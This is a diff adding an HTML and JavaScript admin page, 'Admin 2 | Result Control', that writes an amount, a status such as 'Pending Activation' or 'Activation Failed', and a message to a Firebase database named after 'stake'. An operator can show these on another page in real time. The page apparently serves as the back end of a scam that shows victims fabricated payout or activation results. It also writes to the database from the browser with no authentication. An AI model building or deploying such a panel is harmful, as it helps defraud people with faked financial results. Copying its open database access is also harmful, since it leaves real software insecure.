@@ -1,0 +1,493 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Admin 2 | Result Control</title>
+
+<style>
+* {
+    box-sizing: border-box;
+}
+
+body {
+    margin: 0;
+    font-family: Arial, sans-serif;
+    background: #f3f5f8;
+    color: #222;
+}
+
+header {
+    background: #0b3d91;
+    color: white;
+    padding: 20px;
+    text-align: center;
+}
+
+.container {
+    width: 100%;
+    max-width: 550px;
+    margin: 35px auto;
+    padding: 20px;
+}
+
+.panel {
+    background: white;
+    border-radius: 12px;
+    padding: 25px;
+    box-shadow: 0 5px 25px rgba(0,0,0,.10);
+}
+
+h2 {
+    color: #0b3d91;
+    margin-top: 0;
+}
+
+label {
+    display: block;
+    margin-top: 18px;
+    margin-bottom: 7px;
+    font-weight: bold;
+}
+
+input,
+select,
+textarea {
+    width: 100%;
+    padding: 12px;
+    border: 1px solid #ccc;
+    border-radius: 6px;
+    font-size: 16px;
+}
+
+textarea {
+    min-height: 90px;
+    resize: vertical;
+}
+
+button {
+    width: 100%;
+    padding: 13px;
+    margin-top: 15px;
+    border: 0;
+    border-radius: 6px;
+    font-size: 16px;
+    font-weight: bold;
+    cursor: pointer;
+}
+
+.activate {
+    background: #0b3d91;
+    color: white;
+}
+
+.deactivate {
+    background: #d93025;
+    color: white;
+}
+
+.refresh {
+    background: #eee;
+}
+
+.status-box {
+    margin-top: 25px;
+    padding: 15px;
+    background: #f7f8fa;
+    border-radius: 8px;
+}
+
+.status-indicator {
+    font-weight: bold;
+}
+
+.active {
+    color: #188038;
+}
+
+.inactive {
+    color: #d93025;
+}
+
+.message {
+    display: none;
+    margin-top: 15px;
+    padding: 12px;
+    border-radius: 6px;
+    text-align: center;
+}
+
+.success {
+    display: block;
+    background: #e6f4ea;
+    color: #137333;
+}
+
+.error {
+    display: block;
+    background: #fce8e6;
+    color: #c5221f;
+}
+</style>
+</head>
+
+<body>
+
+<header>
+    <h1>ADMIN 2</h1>
+    <p>Result Control Panel</p>
+</header>
+
+<div class="container">
+
+    <div class="panel">
+
+        <h2>Configure Result</h2>
+
+        <label for="action">Next Action</label>
+
+        <select id="action">
+            <option value="modal">
+                Display Result Modal
+            </option>
+
+            <option value="nextPage">
+                Go To Next Page
+            </option>
+        </select>
+
+        <label for="amount">Amount</label>
+
+        <input
+            type="text"
+            id="amount"
+            placeholder="Example: $100"
+        >
+
+        <label for="status">Status</label>
+
+        <select id="status">
+
+            <option value="Complete">
+                Complete
+            </option>
+
+            <option value="Pending Activation">
+                Pending Activation
+            </option>
+
+            <option value="Activation Failed">
+                Activation Failed
+            </option>
+
+        </select>
+
+        <label for="message">Message</label>
+
+        <textarea
+            id="message"
+            placeholder="Optional message"
+        ></textarea>
+
+        <button
+            class="activate"
+            onclick="activateResult()"
+        >
+            ACTIVATE RESULT
+        </button>
+
+        <button
+            class="deactivate"
+            onclick="deactivateResult()"
+        >
+            DEACTIVATE RESULT
+        </button>
+
+        <button
+            class="refresh"
+            onclick="loadCurrentResult()"
+        >
+            REFRESH STATUS
+        </button>
+
+        <div id="messageBox" class="message"></div>
+
+        <div class="status-box">
+
+            <h3>Current Firebase Status</h3>
+
+            <p>
+                Active:
+                <span
+                    id="currentActive"
+                    class="status-indicator inactive"
+                >
+                    Checking...
+                </span>
+            </p>
+
+            <p>
+                Action:
+                <span id="currentAction">
+                    -
+                </span>
+            </p>
+
+            <p>
+                Amount:
+                <span id="currentAmount">
+                    -
+                </span>
+            </p>
+
+            <p>
+                Status:
+                <span id="currentStatus">
+                    -
+                </span>
+            </p>
+
+        </div>
+
+    </div>
+
+</div>
+
+<!-- Firebase -->
+<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+
+<script>
+
+const firebaseConfig = {
+    databaseURL:
+        "https://stake-f540f-default-rtdb.firebaseio.com/"
+};
+
+firebase.initializeApp(firebaseConfig);
+
+const controlRef =
+    firebase.database().ref("admin2_control");
+
+
+function showMessage(text, type) {
+
+    const box =
+        document.getElementById("messageBox");
+
+    box.textContent = text;
+
+    box.className =
+        "message " + type;
+
+    setTimeout(() => {
+
+        box.className = "message";
+
+    }, 3000);
+}
+
+
+function activateResult() {
+
+    const action =
+        document.getElementById("action").value;
+
+    const amount =
+        document.getElementById("amount").value.trim();
+
+    const status =
+        document.getElementById("status").value;
+
+    const message =
+        document.getElementById("message").value.trim();
+
+    if (action === "modal" && !amount) {
+
+        showMessage(
+            "Enter an amount before activating a modal result.",
+            "error"
+        );
+
+        return;
+    }
+
+    const data = {
+
+        active: true,
+
+        action: action,
+
+        amount: amount,
+
+        status: status,
+
+        message: message,
+
+        updatedAt:
+            new Date().toISOString()
+
+    };
+
+    controlRef.set(data)
+        .then(() => {
+
+            showMessage(
+                "Result activated successfully.",
+                "success"
+            );
+
+        })
+        .catch(error => {
+
+            console.error(error);
+
+            showMessage(
+                "Could not activate the result.",
+                "error"
+            );
+
+        });
+}
+
+
+function deactivateResult() {
+
+    controlRef.update({
+
+        active: false
+
+    })
+    .then(() => {
+
+        showMessage(
+            "Result has been deactivated.",
+            "success"
+        );
+
+    })
+    .catch(error => {
+
+        console.error(error);
+
+        showMessage(
+            "Could not deactivate the result.",
+            "error"
+        );
+
+    });
+}
+
+
+function loadCurrentResult() {
+
+    controlRef.once("value")
+        .then(snapshot => {
+
+            const data =
+                snapshot.val();
+
+            if (!data) {
+
+                document.getElementById(
+                    "currentActive"
+                ).textContent = "NO RESULT";
+
+                document.getElementById(
+                    "currentActive"
+                ).className =
+                    "status-indicator inactive";
+
+                return;
+            }
+
+            document.getElementById(
+                "currentActive"
+            ).textContent =
+                data.active === true
+                    ? "ACTIVE"
+                    : "INACTIVE";
+
+            document.getElementById(
+                "currentActive"
+            ).className =
+                data.active === true
+                    ? "status-indicator active"
+                    : "status-indicator inactive";
+
+            document.getElementById(
+                "currentAction"
+            ).textContent =
+                data.action || "-";
+
+            document.getElementById(
+                "currentAmount"
+            ).textContent =
+                data.amount || "-";
+
+            document.getElementById(
+                "currentStatus"
+            ).textContent =
+                data.status || "-";
+
+        })
+        .catch(error => {
+
+            console.error(error);
+
+        });
+}
+
+
+controlRef.on("value", snapshot => {
+
+    const data =
+        snapshot.val();
+
+    if (!data) {
+
+        document.getElementById(
+            "currentActive"
+        ).textContent = "NO RESULT";
+
+        return;
+    }
+
+    document.getElementById(
+        "currentActive"
+    ).textContent =
+        data.active === true
+            ? "ACTIVE"
+            : "INACTIVE";
+
+    document.getElementById(
+        "currentActive"
+    ).className =
+        data.active === true
+            ? "status-indicator active"
+            : "status-indicator inactive";
+
+    document.getElementById(
+        "currentAction"
+    ).textContent =
+        data.action || "-";
+
+    document.getElementById(
+        "currentAmount"
+    ).textContent =
+        data.amount || "-";
+
+    document.getElementById(
+        "currentStatus"
+    ).textContent =
+        data.status || "-";
+
+});
+
+
+loadCurrentResult();
+
+</script>
+
+</body>
+</html>
